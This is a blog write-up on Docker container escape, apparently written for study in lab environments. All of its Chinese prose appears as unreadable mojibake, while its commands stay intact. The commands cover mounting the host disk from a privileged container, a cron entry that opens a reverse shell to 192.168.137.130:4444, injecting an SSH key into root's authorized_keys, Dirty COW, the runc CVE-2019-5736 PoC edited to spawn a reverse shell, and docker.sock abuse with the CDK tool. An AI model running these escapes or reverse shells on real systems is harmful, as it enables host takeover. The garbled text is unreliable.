<p><br />è¿›å…¥å®¹å™¨ï¼š<br />ä½¿ç”¨<code>fdisk</code>å‘½ä»¤æŸ¥çœ‹ç£ç›˜æ–‡ä»¶ï¼š<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1611056709262-0c02176e-f220-47ff-85a4-abcbe2cec8ef.png#align=left&display=inline&height=310&margin=%5Bobject%20Object%5D&originHeight=310&originWidth=860&status=done&style=none&width=860" loading="lazy"><br /></p>
<blockquote>
<p>åœ¨ç‰¹æƒæ¨¡å¼ä¸‹ï¼Œé€ƒé€¸çš„æ–¹å¼å¾ˆå¤šï¼Œæ¯”å¦‚ï¼šç›´æ¥åœ¨å®¹å™¨å†…éƒ¨æŒ‚è½½å®¿ä¸»æœºç£ç›˜ï¼Œç„¶ååˆ‡æ¢æ ¹ç›®å½•ã€‚</p>
</blockquote>
<p><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1611056870001-f0533c4f-06b5-4b9f-a3ef-51aea5bd2417.png?x-oss-process=image/resize,w_1362#align=left&display=inline&height=228&margin=%5Bobject%20Object%5D&originHeight=228&originWidth=1362&status=done&style=none&width=1362" loading="lazy"><br />æˆåŠŸé€ƒé€¸ã€‚<br />ç„¶åå°±æ˜¯è®¡åˆ’ä»»åŠ¡æ‹¿shell<br /></p>
<pre class="language-none"><code class="language-none">echo &#39;* * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.137.130&#x2F;4444 0&gt;&amp;1&#39; &gt;&gt; &#x2F;test&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</code></pre>

<p><br />æˆ–è€…å°†å®¿ä¸»æœºçš„rootç›®å½•æŒ‚è½½åˆ°å®¹å™¨<br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">docker run -itd -v /root:/root ubuntu:18.04 /bin/bash</code></pre>

<p><br />å†™å…¥ä¸€ä¸ªsshå¯†é’¥<br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /root/.ssh
<span class="token function">cat</span> id_rsa.pub <span class="token operator">>></span> /root/.ssh/authorized_keys
<span class="token comment">#ç„¶åä½¿ç”¨sshç§é’¥è¿œç¨‹ç™»å½•</span>
<span class="token function">ssh</span> root@192.168.137.129</code></pre>


<p><a name="e3402d5b"></a></p>
<h3 id="Dirty-COWæ¼æ´é€ƒé€¸"><a href="#Dirty-COWæ¼æ´é€ƒé€¸" class="headerlink" title="Dirty COWæ¼æ´é€ƒé€¸"></a>Dirty COWæ¼æ´é€ƒé€¸</h3><p><br />Dirty Cowï¼ˆCVE-2016-5195ï¼‰æ˜¯Linuxå†…æ ¸ä¸­çš„æƒé™æå‡æ¼æ´ï¼ŒåŸå› æ˜¯ç”±äºLinuxå†…æ ¸çš„å†…å­˜å­ç³»ç»Ÿåœ¨å¤„ç†å†™å…¥æ—¶æ‹·è´å­˜åœ¨ç«äº‰ï¼Œå…è®¸æ¶æ„ç”¨æˆ·ææƒè·å–å…¶ä»–åªè¯»æ˜ å°„çš„å†™æƒé™ã€‚<br /></p>
<blockquote>
<p>ç«äº‰æ¡ä»¶æ„ä¸ºä»»åŠ¡æ‰§è¡Œé¡ºåºå¼‚å¸¸ï¼Œå¯èƒ½å¯¼è‡´åº”ç”¨å´©æºƒæˆ–é¢ä¸´æ”»å‡»è€…çš„ä»£ç æ‰§è¡Œå¨èƒã€‚åˆ©ç”¨è¯¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨å…¶ç›®æ ‡ç³»ç»Ÿå†…æå‡æƒé™ï¼Œç”šè‡³è·å–åˆ°rootæƒé™ã€‚</p>
</blockquote>
<p><br />è¿™é‡Œä½¿ç”¨iæ˜¥ç§‹çš„é¶åœºç¯å¢ƒè¿›è¡Œå¤ç°ã€‚<br /></p>
<blockquote>
<p>åœ°å€ï¼šchunqiu.com/experiment/catalog?id=100295<br>pocæ‰€åœ¨çš„GitHubé¡¹ç›®ï¼š<a target="_blank" rel="noopener" href="https://github.com/whu-enjoy/CVE-2016-5195">https://github.com/whu-enjoy/CVE-2016-5195</a></p>
</blockquote>
<p><br />é¦–å…ˆæ‰“å¼€ç¯å¢ƒåéœ€è¦è¿è¡Œdockerï¼Œç”±äºç¯å¢ƒä¸­å·²ç»ç»™äº†é•œåƒï¼Œåªéœ€è¦åˆ›å»ºç›¸åº”å®¹å™¨å³å¯<br /></p>
<pre class="language-none"><code class="language-none">docker run --name&#x3D;m0re -p 1234:1234 -itd dirtycow &#x2F;bin&#x2F;bash
#è¿›å…¥å®¹å™¨
docker exec -it m0re &#x2F;bin&#x2F;bash</code></pre>

<p><br />ç¯å¢ƒé‡Œæœ‰ç°æˆçš„POCï¼Œç›´æ¥ä½¿ç”¨å³å¯ã€‚makeç¼–è¯‘cæ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œ<code>./0xdeadbeef</code><br />å‡ºç°successfullyå³ä¸ºæˆåŠŸ<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818216-fd6cd56e-7e7f-4fa7-a825-6ec85c42797b.png#align=left&display=inline&height=261&margin=%5Bobject%20Object%5D&originHeight=261&originWidth=734&size=0&status=done&style=none&width=734" loading="lazy"><br />å°±å·²ç»è·å–åˆ°å®¿ä¸»æœºçš„shelläº†ï¼Œæ¥ä¸‹æ¥è¿›è¡ŒéªŒè¯ã€‚<br />è¿™ä¸ªæ—¶å€™è¿›å…¥homeæ–‡ä»¶å¤¹ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªuserçš„æ–‡ä»¶å¤¹ï¼Œç„¶ååœ¨æ­¤å¤„åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶å¤¹ã€‚<br />é€€å‡ºç¯å¢ƒåå‘ç°äº†åœ¨å®¿ä¸»æœºçš„homeæ–‡ä»¶å¤¹ä¸­ä¹Ÿå‡ºç°äº†<code>m0re</code>è¿™ä¸ªæ–‡ä»¶ï¼Œè€Œä¸”æ˜¯å±äºrootç”¨æˆ·ç»„çš„<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818230-31aa81c0-8584-49ba-a3fc-65b6ff93e9e9.png#align=left&display=inline&height=183&margin=%5Bobject%20Object%5D&originHeight=183&originWidth=857&size=0&status=done&style=none&width=857" loading="lazy"><br />è¿™ä¸ªå°±æ˜¯æˆåŠŸåˆ©ç”¨äº†ï¼ŒDirtyCowå®ç°äº†dockeré€ƒé€¸ã€‚<br /></p>
<p><a name="4f201b6f"></a></p>
<h3 id="runcå®¹å™¨é€ƒé€¸æ¼æ´"><a href="#runcå®¹å™¨é€ƒé€¸æ¼æ´" class="headerlink" title="runcå®¹å™¨é€ƒé€¸æ¼æ´"></a>runcå®¹å™¨é€ƒé€¸æ¼æ´</h3><p><br />runcå®¹å™¨é€ƒé€¸æ¼æ´(CVE-2019-5736 )åŸç†<br /></p>
<blockquote>
<p>dockeræˆ–è€…æ˜¯å…¶ä»–åŸºäºruncçš„å®¹å™¨è¿è¡Œæ—¶å­˜åœ¨çš„å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ç‰¹å®šçš„å®¹å™¨é•œåƒæˆ–è€…execæ“ä½œè·å–å®¿ä¸»æœºruncæ‰§è¡Œæ—¶çš„æ–‡ä»¶å¥æŸ„å¹¶ä¿®æ”¹runcçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä»è€Œè·å–å®¿ä¸»æœºçš„rootæƒé™ã€‚</p>
</blockquote>
<blockquote>
<p>runcï¼šæ˜¯ä¸€ä¸ªè½»é‡çº§çš„ç”¨æ¥è¿è¡Œå®¹å™¨çš„å·¥å…·ï¼Œå®ƒå¯ä»¥ä¸é€šè¿‡dockerå¼•æ“ï¼Œç›´æ¥è¿è¡Œå®¹å™¨ã€‚runcç›®å‰åªæ”¯æŒLinuxå¹³å°ã€‚</p>
</blockquote>
<p><br />å½±å“èŒƒå›´ï¼šDockerç‰ˆæœ¬ &lt; 18.09.2 æˆ–è€…ä½¿ç”¨ runcç‰ˆæœ¬ &lt;= 1.0-rc6çš„ç¯å¢ƒ<br />æ¼æ´å¤ç°ï¼š<a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC/">https://github.com/Frichetten/CVE-2019-5736-PoC/</a><br />ç¯å¢ƒæ­å»ºï¼Œä½¿ç”¨ç½‘ä¸Šå…¬å¼€çš„ç¯å¢ƒï¼š<a target="_blank" rel="noopener" href="https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw">https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw</a><br />ä¸€æ­¥æ­å»ºå¹¶è¿›å…¥å®¹å™¨<br /></p>
<pre class="language-none"><code class="language-none">curl https:&#x2F;&#x2F;gist.githubusercontent.com&#x2F;thinkycx&#x2F;e2c9090f035d7b09156077903d6afa51&#x2F;raw -o install.sh &amp;&amp; bash install.sh</code></pre>

<p><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818250-e2ca6c32-5111-434a-a278-b72e8fd60658.png#align=left&display=inline&height=509&margin=%5Bobject%20Object%5D&originHeight=509&originWidth=831&size=0&status=done&style=none&width=831" loading="lazy"><br /><br><br />ç„¶åä¸‹è½½POCï¼Œä¿®æ”¹ç›¸åº”è„šæœ¬<br />ä¿®æ”¹ <code>vi main.go</code><br /></p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F; This is the line of shell commands that will execute on the host
var payload &#x3D; &quot;#!&#x2F;bin&#x2F;bash \n cat &#x2F;etc&#x2F;shadow &gt; &#x2F;tmp&#x2F;shadow &amp;&amp; chmod 777 &#x2F;tmp&#x2F;shadow&quot;
ä¿®æ”¹ä¸ºåå¼¹shellçš„å‘½ä»¤
var payload &#x3D; &quot;#!&#x2F;bin&#x2F;bash \n bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.137.129&#x2F;4444 0&gt;&amp;1&quot;</code></pre>

<p><br />ip ä¿®æ”¹ä¸ºkaliçš„IPåœ°å€ã€‚ç«¯å£è®¾ç½®ä¸ºkaliçš„ncç›‘å¬çš„ç«¯å£ã€‚<br />ç„¶åç¼–è¯‘main.goæ–‡ä»¶ï¼Œéœ€è¦goè¯­è¨€ç¯å¢ƒï¼Œè€Œä¸”åœ¨Linuxç¯å¢ƒä¸­ï¼Œå®‰è£…<code>apt install golang</code><br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">go build main.go<span class="token comment">#ç¼–è¯‘goæ–‡ä»¶</span>
<span class="token comment">#å¤åˆ¶åˆ°dockeré‡Œé¢</span>
docker <span class="token function">cp</span> ./main ccc443617e49:/home
<span class="token comment">#ä¿®æ”¹æƒé™</span>
<span class="token function">chmod</span> <span class="token number">777</span> main</code></pre>

<p><br />çœ‹åˆ°åœ¨dockeré‡Œé¢æ˜¯å·²ç»å¤åˆ¶è¿‡æ¥äº†ã€‚<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818276-188781c9-5aee-43a6-8364-d5e20e04cb11.png#align=left&display=inline&height=100&margin=%5Bobject%20Object%5D&originHeight=100&originWidth=599&size=0&status=done&style=none&width=599" loading="lazy"><br />æ‰§è¡Œmainæ–‡ä»¶<code>./main</code><br />ç„¶åé‡æ–°å¼€å¯æ–°ç»ˆç«¯ï¼Œåä½¿ç”¨execè¿›å…¥dockerã€‚<br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">docker <span class="token builtin class-name">exec</span> -it ccc443617e49 /bin/bash</code></pre>

<p><br />ç„¶åpayloadæˆåŠŸæ‰§è¡Œ<br /><br><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818201-2b418c11-3f0b-404c-8a76-1793033df13f.png#align=left&display=inline&height=158&margin=%5Bobject%20Object%5D&originHeight=158&originWidth=717&size=0&status=done&style=none&width=717" loading="lazy"><br />è¿™ä¸ªå·²ç»æ˜¯æˆåŠŸäº†ï¼Œç„¶åncç›‘å¬çš„ç«¯å£ï¼Œåå¼¹å›shell<br /></p>
<p><a name="137e7004"></a></p>
<h3 id="Docker-cpå‘½ä»¤å¯å¯¼è‡´å®¹å™¨é€ƒé€¸æ”»å‡»æ¼æ´ï¼ˆCVE-2019-14271ï¼‰"><a href="#Docker-cpå‘½ä»¤å¯å¯¼è‡´å®¹å™¨é€ƒé€¸æ”»å‡»æ¼æ´ï¼ˆCVE-2019-14271ï¼‰" class="headerlink" title="Docker cpå‘½ä»¤å¯å¯¼è‡´å®¹å™¨é€ƒé€¸æ”»å‡»æ¼æ´ï¼ˆCVE-2019-14271ï¼‰"></a>Docker cpå‘½ä»¤å¯å¯¼è‡´å®¹å™¨é€ƒé€¸æ”»å‡»æ¼æ´ï¼ˆCVE-2019-14271ï¼‰</h3><p><br />æ¼æ´æè¿°ï¼šå½“Dockerå®¿ä¸»æœºä½¿ç”¨cpå‘½ä»¤æ—¶ï¼Œä¼šè°ƒç”¨è¾…åŠ©è¿›ç¨‹docker-tarï¼Œè¯¥è¿›ç¨‹æ²¡æœ‰è¢«å®¹å™¨åŒ–ï¼Œä¸”ä¼šåœ¨è¿è¡Œæ—¶åŠ¨æ€åŠ è½½ä¸€äº›libnss_.soåº“ã€‚é»‘å®¢å¯ä»¥é€šè¿‡åœ¨å®¹å™¨ä¸­æ›¿æ¢libnss_.soç­‰åº“ï¼Œå°†ä»£ç æ³¨å…¥åˆ°docker-tarä¸­ã€‚å½“Dockerç”¨æˆ·å°è¯•ä»å®¹å™¨ä¸­æ‹·è´æ–‡ä»¶æ—¶å°†ä¼šæ‰§è¡Œæ¶æ„ä»£ç ï¼ŒæˆåŠŸå®ç°Dockeré€ƒé€¸ï¼Œè·å¾—å®¿ä¸»æœºrootæƒé™ã€‚<br />åœ¨è¿™ç¯‡<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193218">ç¿»è¯‘æ–‡ç« </a>æœ‰ä»‹ç»ï¼Œç½‘ä¸Šæ²¡æœ‰æ‰¾åˆ°ç›¸åº”çš„ç¯å¢ƒï¼Œä¹Ÿæ‡’å¾—æ­å»ºç¯å¢ƒäº†ï¼Œå¤ç°è¿‡ç¨‹çœç•¥==<br />è€Œä¸”ï¼Œå¤ç°å¯¹ç›®å‰æˆ‘æ¥è¯´æœ‰ç‚¹å›°éš¾ï¼Œæ‰€ä»¥åªäº†è§£ä¸€ä¸‹ã€‚<br /></p>
<p><a name="bef623de"></a></p>
<h3 id="å±é™©æŒ‚è½½å¯¼è‡´Docker-é€ƒé€¸"><a href="#å±é™©æŒ‚è½½å¯¼è‡´Docker-é€ƒé€¸" class="headerlink" title="å±é™©æŒ‚è½½å¯¼è‡´Docker é€ƒé€¸"></a>å±é™©æŒ‚è½½å¯¼è‡´Docker é€ƒé€¸</h3><p><br />æŒ‚è½½ç›®å½•ï¼ˆ-v /:/softï¼‰<br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">docker run -itd -v /dir:/dir ubuntu:18.04 /bin/bash</code></pre>

<p><br />å…ˆæ”¾ä¸€ä¸ªå·¥å…·cdkï¼š<a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK/">https://github.com/cdk-team/CDK/</a><br />ä½¿ç”¨ï¼šä¸‹è½½å¯æ‰§è¡Œæ–‡ä»¶æŠ•é€’åˆ°å·²æ”»å…¥çš„å®¹å™¨å†…éƒ¨å¼€å§‹æµ‹è¯•<br />ä½¿ç”¨è¯´æ˜ï¼š<a target="_blank" rel="noopener" href="https://www.cdxy.me/?p=840">https://www.cdxy.me/?p=840</a><br /><strong>å¤ç°é€ƒé€¸è¿‡ç¨‹</strong><br />åˆ›å»ºä¸€ä¸ªæŒ‚è½½/var/run/docker.sockçš„å®¹å™¨<br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">docker run -itd -v /var/run/docker.sock:/var/run/docker.sock ubuntu</code></pre>

<p><br />ç„¶åexecè¿›å…¥å®¹å™¨ä¸­å»ï¼Œåœ¨å®¹å™¨ä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å®‰è£…dockerå‘½ä»¤è¡Œå®¢æˆ·ç«¯ã€‚<br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">apt-update
<span class="token function">apt-get</span> <span class="token function">install</span> <span class="token punctuation">\</span>
apt-transport-https <span class="token punctuation">\</span>
ca-certificates <span class="token punctuation">\</span>
<span class="token function">curl</span> <span class="token punctuation">\</span>
gnupg-agent <span class="token punctuation">\</span>
software-properties-common
<span class="token function">curl</span> -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg <span class="token operator">|</span> apt-key <span class="token function">add</span> -
apt-key fingerprint 0EBFCD88
add-apt-repository <span class="token punctuation">\</span>
<span class="token string">"deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/ \
<span class="token variable"><span class="token variable">$(</span>lsb_release -cs<span class="token variable">)</span></span> \
stable"</span>
<span class="token function">apt-get</span> update
<span class="token function">apt-get</span> <span class="token function">install</span> docker-ce docker-ce-cli containerd.io</code></pre>

<p><br />æ¥ç€ä½¿ç”¨è¯¥å®¢æˆ·ç«¯é€šè¿‡Docker Socketä¸Dockerå®ˆæŠ¤è¿›ç¨‹é€šä¿¡ï¼Œå‘é€å‘½ä»¤åˆ›å»ºå¹¶è¿è¡Œä¸€ä¸ªæ–°çš„å®¹å™¨ï¼Œå°†å®¿ä¸»æœºçš„æ ¹ç›®å½•æŒ‚è½½åˆ°æ–°åˆ›å»ºçš„å®¹å™¨å†…éƒ¨<br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">docker run -it -v /:/host ubuntu:18.04 /bin/bash</code></pre>

<p><br />åœ¨æ–°å®¹å™¨å†…æ‰§è¡Œchrootå°†æ ¹ç›®å½•åˆ‡æ¢åˆ°æŒ‚è½½çš„å®¿ä¸»æœºæ ¹ç›®å½•ã€‚<br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chroot</span> /test</code></pre>

<p><br />ä½¿ç”¨cdkå·¥å…·æ‰§è¡Œå‘½ä»¤ï¼š<br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">./cdk run docker-sock-pwn /var/run/docker.sock <span class="token string">"touch /host/tmp/pwn-success"</span></code></pre>


<p><a name="7a0a21d5"></a></p>
<h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p><br />dockeré€ƒé€¸æ–¹é¢è¿˜æœ‰è®¸å¤šå†…å®¹ï¼Œåªæ˜¯ç”±äºæ—¶é—´é—®é¢˜æš‚æ—¶æ€»ç»“è¿™ä¹ˆå¤šï¼Œç»™è‡ªå·±åšä¸ªè®°å½•ï¼Œä¹Ÿä¸ç”¨åˆ°å¤„ç¿»çœ‹èµ„æ–™äº†ï¼Œå‰©ä¸‹çš„ç›®å‰æœªå®Œæˆçš„çŸ¥è¯†ç‚¹ï¼Œå·²ç»æ”¾åœ¨ä¸‹æ–¹é“¾æ¥ä¸­ï¼Œç­‰ä»¥åå†ç ”ç©¶ã€‚<br /></p>
<p><a name="2a302fa5"></a></p>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><br /><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1512483">https://cloud.tencent.com/developer/article/1512483</a><br /><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8558">https://xz.aliyun.com/t/8558</a><br /><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/49b2155ed477">https://www.jianshu.com/p/49b2155ed477</a><br /><a target="_blank" rel="noopener" href="https://threezh1.com/2021/02/26/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8Cheat_Sheet">https://threezh1.com/2021/02/26/äº‘åŸç”Ÿå®‰å…¨Cheat_Sheet</a><br /><a target="_blank" rel="noopener" href="https://www.ofweek.com/security/2020-07/ART-510010-11000-30450447_3.html">https://www.ofweek.com/security/2020-07/ART-510010-11000-30450447_3.html</a><br /><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8558">https://xz.aliyun.com/t/8558</a><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /></p>
</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="æ‰“èµ" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me a candy.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg"><img loading="lazy" src="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg" alt="å¾®ä¿¡æ”¯ä»˜" title="å¾®ä¿¡æ”¯ä»˜"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>æœ¬æ–‡ä½œè€…ï¼š</strong>m0re</li><li class="post-copyright-link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="https://m0re.top/posts/abcd4c1e/" title="Dockeré€ƒé€¸">https://m0re.top/posts/abcd4c1e/</a></li><li class="post-copyright-license"><strong>ç‰ˆæƒå£°æ˜ï¼š</strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é»˜è®¤é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> è®¸å¯åè®®ã€‚</li></ul></section></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/6cc4794c/" rel="next" title="ä»ä¸€é“CTFé¢˜ç›®åˆ°éå¯¹ç§°åŠ å¯†GPG/PGPçš„å­¦ä¹ "><span class="post-nav-text">ä»ä¸€é“CTFé¢˜ç›®åˆ°éå¯¹ç§°åŠ å¯†GPG/PGPçš„å­¦ä¹ </span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div id="comment"><div class="comment-tooltip text-center"><span>å°è¯•ä½¿ç”¨ utterances ï¼ˆåŸºäº GitHub Issuesï¼‰è¯„è®ºç³»ç»Ÿã€‚</span><br><span>æ‚¨å¯ä»¥ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®åˆ‡æ¢å¯¹åº”è¯„è®ºç³»ç»Ÿï¼Œ</span><br><span><script>function showUtterances(){ document.querySelector(".utterances").style.display='block'; document.querySelector('#valine-container').style.display='none'; }function showValine(){ document.querySelector('#valine-container').style.display='block'; document.querySelector(".utterances").style.display='none'; }</script></span><br><span><a class="hty-button hty-button--raised" onclick="showValine()">Valine</a><a class="hty-button hty-button--raised" onclick="showUtterances()">utterances</a></span><br><span><style>.utterances{display:none;}</style></span><br></div><div id="valine-container"></div><script src="https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><script>function initValine() {
  const valineConfig = {"enable":true,"appId":"gUEA9zKLhCnMFxQI5kI20WiD-gzGzoHsz","appKey":"GQKAp04LNloy3MrDMv86MI3i","placeholder":"è¯„è®ºä¸€ä¸‹~&nbsp_(:Ğ·ã€âˆ )_ ï¼ˆå¡«å†™é‚®ç®±å¯ä»¥æ”¶åˆ°å›å¤é€šçŸ¥ï½ï¼‰","avatar":null,"pageSize":10,"visitor":true,"highlight":true,"recordIP":true,"enableQQ":true,"requiredFields":["nick","mail"],"el":"#valine-container","lang":"zh-cn"}
  valineConfig.path = window.location.pathname
  new Valine(valineConfig)
}
setTimeout(initValine, 800)</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">è±«ICPå¤‡2020025591å·-1</a></div><div class="copyright"><span>&copy; 2020 â€“ 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> m0re</span></div><div class="powered"><span>ç”± <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> é©±åŠ¨ v5.1.0</span><span class="footer-separator">|</span><span>ä¸»é¢˜ - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.3.0</span></div><div class="live_time"><span>æœ¬åšå®¢å·²è‹Ÿå»¶æ®‹å–˜äº†</span><span id="display_live_time"></span><span class="moe-text">(â—'â—¡'â—)</span><script>function blog_live_time() {
  window.setTimeout(blog_live_time, 1000);
  const start = new Date('2020-02-21T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " å¤© " + passHour + " å°æ—¶ " + passMinute + " åˆ† " + passSecond + " ç§’";
}
blog_live_time();
</script></div><div id="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv" title="æ€»è®¿å®¢é‡"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="æ€»è®¿é—®é‡"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg></span><span id="busuanzi_value_site_pv"></span></span></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#6200ee" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="æœç´¢"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="æœç´¢..." value=""></div><div id="local-search-result"></div></div></div><script defer src="/js/utils.js"></script><script defer src="/js/hexo-theme-yun.js"></script><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>